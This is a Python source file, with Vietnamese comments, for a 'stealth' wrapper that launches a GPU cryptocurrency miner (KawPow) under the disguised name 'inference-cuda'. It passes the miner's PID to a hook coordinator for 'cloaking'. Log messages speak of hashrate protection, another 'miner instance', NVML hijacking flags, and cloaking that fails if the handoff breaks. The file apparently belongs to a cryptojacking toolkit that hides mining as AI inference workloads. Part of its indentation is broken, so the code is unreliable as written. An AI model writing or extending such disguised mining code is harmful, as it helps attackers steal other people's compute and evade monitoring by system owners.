import os
import sys
import signal
import time
import subprocess
import threading
import random
from pathlib import Path
import ctypes # Thêm thư viện ctypes để gọi syscall
import fcntl  # Optional single-instance guard (file lock)

# PHASE 3+: Enhanced Hook Sequencing - Import psutil for dynamic detection
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("⚠️ [PHASE3+] psutil not available - fallback to static timing")

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Import required modules
try:
    from mining_environment.scripts.module_loggers import get_stealth_inference_logger
    from mining_environment.coordination.coordinator import HookCoordinator
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)

# Setup logging với GPU-specific logger name
logger = get_stealth_inference_logger()

_LOCK_FH = None  # giữ handle lock file nếu bật single-instance guard

def acquire_single_instance_lock(lock_path: str = "/tmp/inference_cuda.lock") -> bool:
    """
    **[Single-Instance Lock]** (khóa một phiên – tránh chạy trùng khi cần)

    Chỉ kích hoạt khi người dùng bật ENV `SINGLE_INSTANCE=1`. Dùng `fcntl.flock` non-blocking.

    Returns:
        bool: True nếu khóa thành công hoặc guard không bật; False nếu đã có instance khác.
    """
    global _LOCK_FH
    enable_guard = str(os.getenv("SINGLE_INSTANCE", "0")).lower() in ("1", "true", "yes")
    if not enable_guard:
        return True

    try:
        _LOCK_FH = open(lock_path, "w")
        fcntl.flock(_LOCK_FH.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        _LOCK_FH.write(str(os.getpid()))
        _LOCK_FH.flush()
        logger.info(f"🔒 [SINGLE-INSTANCE] Acquired lock at {lock_path}")
        return True
    except Exception as lock_err:
        logger.warning(f"⚠️ [SINGLE-INSTANCE] Another instance detected (lock failed: {lock_err})")
        return False

def signal_handler(signum, frame):
    """
    **[Signal Handler]** (xử lý tín hiệu) để đảm bảo cleanup khi GPU process bị terminate.
    """
    logger.info(f"🛑 [GPU-STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")

    # Self-stealth functionality removed - no cleanup needed
    logger.info("✅ [GPU-STEALTH-WRAPPER] Stealth mode cleanup completed")

    sys.exit(0)

def monitor_and_log_output(process, process_name):
    """
    **[Output Monitor Thread]** (luồng giám sát đầu ra)
    Đọc stdout và stderr từ tiến trình con và ghi lại bằng logger.
    """
    def log_stream(stream, stream_name):
        for line in iter(stream.readline, ''):
            if line.strip():
                logger.info(f"[{process_name}-{stream_name}] {line.strip()}")
        stream.close()

    stdout_thread = threading.Thread(target=log_stream, args=(process.stdout, 'stdout'))
    stderr_thread = threading.Thread(target=log_stream, args=(process.stderr, 'stderr'))
    stdout_thread.start()
    stderr_thread.start()
    stdout_thread.join()
    stderr_thread.join()

def create_enhanced_gpu_environment():
    """
    **[Enhanced GPU Environment Creator]** (tạo môi trường GPU tối ưu)

    Tái sử dụng patterns từ existing modules để tạo clean environment
    cho GPU subprocess với enhanced resource management.

    Returns:
        dict: Clean environment dictionary for GPU subprocess
    """
    logger.info("🔧 [GPU-ENV-OPTIMIZER] Creating enhanced GPU environment using existing patterns")

    # Base environment copy
    clean_env = os.environ.copy()

    # 1. LD_PRELOAD Management - Clean removal to avoid legacy hooks
    if 'LD_PRELOAD' in clean_env:
        clean_env.pop('LD_PRELOAD', None)
        logger.info("🔧 [GPU-ENV-OPTIMIZER] Removed LD_PRELOAD completely (legacy hooks disabled)")

    # 2. NVML Management - Defaults only (no external interceptors)
    clean_env['ENABLE_NVML_IPC_HIJACKING'] = '0'
    clean_env['GPU_MINING_SUBPROCESS'] = '1'

    # 3. CUDA Resource Optimization - tối giản, không ép các cờ giảm hiệu năng
    # Không override NVIDIA_DRIVER_CAPABILITIES nếu đã có; nếu thiếu thì thêm 'compute,utility' để có NVML
    if 'NVIDIA_DRIVER_CAPABILITIES' not in clean_env or not clean_env['NVIDIA_DRIVER_CAPABILITIES']:
        clean_env['NVIDIA_DRIVER_CAPABILITIES'] = 'compute,utility'
        logger.info("✅ [GPU-ENV-OPTIMIZER] Set NVIDIA_DRIVER_CAPABILITIES=compute,utility (NVML enabled)")
    else:
        logger.info("✅ [GPU-ENV-OPTIMIZER] Preserved NVIDIA_DRIVER_CAPABILITIES from parent env")

    # Bỏ các cờ có thể gây tụt hiệu năng nếu lỡ kế thừa
    for k in (
        'CUDA_LAUNCH_BLOCKING',
        'CUDA_CACHE_DISABLE',
        'CUDA_DEVICE_MAX_CONNECTIONS',
        'CUDA_FORCE_PTX_JIT',
        'CUDA_MODULE_LOADING',
        'CUDA_DISABLE_CUBLASLT',
        'CUDA_LAUNCH_TIMEOUT',
    ):
        clean_env.pop(k, None)

    logger.info("✅ [GPU-ENV-OPTIMIZER] Removed performance-limiting CUDA flags (if present)")
    return clean_env

def main():
    """
    **[Main Function]** (hàm chính) - khởi động GPU stealth mode và exec inference-cuda.
    """
    try:
        logger.info("🚀 [GPU-STEALTH-WRAPPER] Starting Stealth GPU-CUDA Inference Wrapper")

        # Register signal handlers để cleanup khi bị terminate
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)

        # Parse command line arguments (forward tất cả args to inference-cuda)
        cuda_inference_args = sys.argv[1:]  # Remove script name
        logger.info(f"🔍 [GPU-STEALTH-WRAPPER] inference-cuda args: {cuda_inference_args}")

        # ✅ OPTIMIZED: Use enhanced GPU environment creator - Tái sử dụng existing patterns
        clean_env = create_enhanced_gpu_environment()

        # Get inference-cuda binary path from environment
        cuda_inference_path = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
        if not os.path.exists(cuda_inference_path):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not found: {cuda_inference_path}")
            sys.exit(1)

        # Verify binary is executable
        if not os.access(cuda_inference_path, os.X_OK):
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] inference-cuda binary not executable: {cuda_inference_path}")
            sys.exit(1)

        logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda binary found: {cuda_inference_path}")

        # Self-stealth functionality removed - process renaming now handled by child process management
        logger.info("✅ [GPU-STEALTH-WRAPPER] Self-stealth mode disabled - using child process renaming only")

        # Optional single-instance guard (off by default)
        if not acquire_single_instance_lock():
            logger.warning("⏭️ [GPU-STEALTH-WRAPPER] Another miner instance is running; exiting early by guard policy")
            sys.exit(0)

        # Small delay để đảm bảo process ready
        time.sleep(0.2)

        # Prepare command để exec inference-cuda
        exec_command = [cuda_inference_path] + cuda_inference_args
        logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")

        # 🚀 PHASE 2: GPU Process Stealth Implementation
        logger.info("🔄 [GPU-STEALTH] Using optimized subprocess stealth mode")

        try:
            # Memory optimization trước khi start inference-cuda (tối giản, tránh giảm hashrate)
            logger.info("🧠 [MEMORY-OPT] Preparing minimal DAG settings…")

            # Chỉ bật progressive DAG nếu người dùng yêu cầu qua ENV (mặc định tắt)
            if str(os.getenv('KAWPOW_DAG_PROGRESSIVE', '0')).lower() in ('1', 'true', 'yes'):
                clean_env['KAWPOW_DAG_PROGRESSIVE'] = '1'
                logger.info("🔧 [TIER-8-CONFIG] KAWPOW_DAG_PROGRESSIVE=1 (enabled by ENV)")
            else:
                clean_env.pop('KAWPOW_DAG_PROGRESSIVE', None)
                logger.info("🔧 [TIER-8-CONFIG] KAWPOW_DAG_PROGRESSIVE disabled by default")

            # Phase-gated safe flags: only set if explicitly enabled via ENV
            # Defaults to disabled to avoid throughput drop after DAG
            enable_dag_safe_flags = str(os.getenv('ENABLE_DAG_SAFE_FLAGS', '0')).lower() in ('1', 'true', 'yes')
            # Hard policy: never allow PTX-only JIT (reduces hashrate)
            if 'CUDA_FORCE_PTX_JIT' in clean_env:
                clean_env.pop('CUDA_FORCE_PTX_JIT', None)
                logger.info("🛡️ [POLICY] Removed CUDA_FORCE_PTX_JIT to protect hashrate")

            if enable_dag_safe_flags:
                # These can reduce performance if kept for the whole run; enable only if explicitly requested
                clean_env['CUDA_LAUNCH_BLOCKING'] = '1'
                clean_env['CUDA_CACHE_DISABLE'] = '1'
                clean_env['CUDA_DEVICE_MAX_CONNECTIONS'] = '1'
                logger.info("🧠 [MEMORY-OPT] DAG safe flags enabled: CUDA_LAUNCH_BLOCKING=1, CUDA_CACHE_DISABLE=1, CUDA_DEVICE_MAX_CONNECTIONS=1")
            else:
                # Ensure these are not present by default
                for k in (
                    'CUDA_LAUNCH_BLOCKING',
                    'CUDA_CACHE_DISABLE',
                    'CUDA_DEVICE_MAX_CONNECTIONS',
                    'CUDA_FORCE_PTX_JIT',
                    'CUDA_MODULE_LOADING',
                    'CUDA_DISABLE_CUBLASLT',
                    'CUDA_LAUNCH_TIMEOUT'
                ):
                    clean_env.pop(k, None)
                logger.info("🧠 [MEMORY-OPT] DAG safe flags disabled by default (ENABLE_DAG_SAFE_FLAGS=0)")

            # Optional: User-defined memory limit (if provided)
            if 'KAWPOW_DAG_MEMORY_LIMIT' in os.environ:
                clean_env['KAWPOW_DAG_MEMORY_LIMIT'] = os.environ['KAWPOW_DAG_MEMORY_LIMIT']
                logger.info("🔧 [TIER-8-CONFIG] Applied user-defined KAWPOW_DAG_MEMORY_LIMIT")

            # Start inference-cuda as subprocess (no process renaming)

            # **FIX: Remove stdout/stderr redirection to allow parent capture** (sửa: bỏ chuyển hướng stdout/stderr để parent có thể capture)
            process = subprocess.Popen(
                exec_command,
                env=clean_env,  # Use clean environment for subprocess ONLY
                preexec_fn=None,
                # stdout and stderr will inherit parent's pipes for logging
                stdout=subprocess.PIPE, # Giữ lại để có thể log output
                stderr=subprocess.PIPE, # Giữ lại để có thể log output
                text=True
            )
            logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")

            # Start monitoring output in a separate thread (ensure mining stdout/stderr are captured)
            monitor_thread = threading.Thread(target=monitor_and_log_output, args=(process, 'inference-cuda'))
            monitor_thread.daemon = True
            monitor_thread.start()

            # 🚀 **PRIMARY HANDOFF TO HOOKCOORDINATOR** (chuyển giao chính đến HookCoordinator)
                # This is the single point of entry for PID registration.
                # The fallback logic has been removed to prevent context mismatch.
                try:
                    from mining_environment.coordination.coordinator import get_hook_coordinator

                    process_metadata = {
                        'role': 'real',
                        'timestamp': time.time(),
                        'wrapper_pid': os.getpid(),
                        'stealth_enabled': False,
                        'registration_source': 'stealth_inference_cuda'
                    }

                    coordinator = get_hook_coordinator()
                    success = coordinator.receive_from_stealth_wrapper(
                        pid=process.pid,
                        process_metadata=process_metadata,
                        subprocess_env=clean_env
                    )

                    if success:
                        logger.info(f"✅ [HANDOFF] Primary handoff to HookCoordinator successful for PID={process.pid}")
                        logger.info(f"🔗 [HANDOFF] Coordination chain: HookCoordinator → DirectPIDRegistry → ResourceManager")
                    else:
                        logger.error(f"❌ [HANDOFF] Primary handoff to HookCoordinator FAILED for PID {process.pid}")
                        logger.warning(f"⚠️ [HANDOFF] Mining will continue, but cloaking and optimization will be DISABLED.")

                except Exception as handoff_err:
                    logger.critical(f"🚨 [HANDOFF-CRITICAL] Could not perform handoff to HookCoordinator: {handoff_err}")
                    logger.warning(f"⚠️ [HANDOFF-CRITICAL] This is a critical architecture failure. Cloaking is non-functional.")
            except Exception as rename_err:
                logger.error(f"❌ [GPU-POST-EXEC] Post-exec sequencing error: {rename_err}")

            # 🔒 PHASE 2: Monitoring/cleanup giữ tối thiểu; readiness-check bị loại bỏ để tránh overhead không cần thiết

            # Wait for subprocess to complete
            return_code = process.wait()
            logger.info(f"🔚 [GPU-POST-EXEC-STEALTH] inference-cuda subprocess completed with code: {return_code}")

            # Cleanup - stealth_manager functionality removed
            logger.info("🧹 [GPU-STEALTH-WRAPPER] Process cleanup completed")
            sys.exit(return_code)

        except Exception as e:
            logger.error(f"❌ [GPU-STEALTH-WRAPPER] Failed to exec inference-cuda: {e}")
            # Fallback to subprocess if exec fails
            logger.info("🔄 [GPU-STEALTH-WRAPPER] Falling back to subprocess mode")

            try:
                # Run inference-cuda as subprocess
                process = subprocess.Popen(
                    exec_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    preexec_fn=None,
                    env=clean_env  # Use clean environment for fallback subprocess too
                )

                logger.info(f"✅ [GPU-STEALTH-WRAPPER] inference-cuda started as subprocess PID: {process.pid}")

                # Start monitoring output in a separate thread
                monitor_thread = threading.Thread(target=monitor_and_log_output, args=(process, 'inference-cuda-fallback'))
                monitor_thread.daemon = True
                monitor_thread.start()

                # Wait for subprocess to complete
                return_code = process.wait()
                logger.info(f"🔚 [GPU-STEALTH-WRAPPER] inference-cuda subprocess completed with code: {return_code}")

                # Cleanup - stealth_manager functionality removed
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Subprocess cleanup completed")
                sys.exit(return_code)

            except Exception as subprocess_error:
                logger.error(f"❌ [GPU-STEALTH-WRAPPER] Subprocess fallback failed: {subprocess_error}")
                logger.info("🧹 [GPU-STEALTH-WRAPPER] Error cleanup completed")
                sys.exit(1)

    except Exception as e:
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Unexpected error: {e}")
        import traceback
        logger.error(f"❌ [GPU-STEALTH-WRAPPER] Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()